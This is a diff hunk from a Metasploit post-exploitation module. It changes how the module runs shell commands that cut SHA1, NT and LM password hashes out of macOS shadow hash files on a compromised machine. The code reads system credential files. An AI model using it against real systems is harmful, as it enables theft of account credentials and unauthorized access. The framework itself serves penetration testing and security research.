@@ -100,9 +100,9 @@ class Metasploit3 < Msf::Post
         end
 
         # Extract the hashes
-        sha1_hash = read_file("/var/db/shadow/hash/#{guid} | cut -c169-216").chomp
-        nt_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c1-32").chomp
-        lm_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c33-64").chomp
+        sha1_hash = cmd_exec("cat /var/db/shadow/hash/#{guid} | cut -c169-216").chomp
+        nt_hash   = cmd_exec("cat /var/db/shadow/hash/#{guid} | cut -c1-32").chomp
+        lm_hash   = cmd_exec("cat /var/db/shadow/hash/#{guid} | cut -c33-64").chomp
 
         # Check that we have the hashes and save them
         if sha1_hash !~ /0000000000000000000000000/
